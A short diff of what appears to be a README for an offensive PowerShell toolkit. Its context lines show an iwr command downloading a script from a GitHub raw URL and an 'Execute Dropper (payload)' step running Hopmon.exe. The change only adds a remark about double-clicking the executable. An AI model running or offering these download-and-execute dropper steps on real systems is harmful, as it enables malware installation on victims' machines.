@@ -282,7 +282,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 
 **Execute Dropper (payload)**
 ```powershell
-.\Hopmon.exe
+.\Hopmon.exe ( or double click to execute )
 ```
 
 <br /><br />
